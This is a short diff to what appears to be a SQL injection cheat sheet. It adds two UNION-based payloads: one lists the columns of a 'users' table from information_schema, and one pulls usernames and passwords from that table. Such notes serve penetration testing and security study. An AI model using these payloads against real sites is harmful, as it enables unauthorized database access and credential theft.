@@ -25,6 +25,8 @@ Order by:
 .
 Until error occurs, then:
 =1 union all select 1, 2, 3...
+=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+=1 union all select 1, username, password from users
 ```
 
 ### Simple SQL injection test
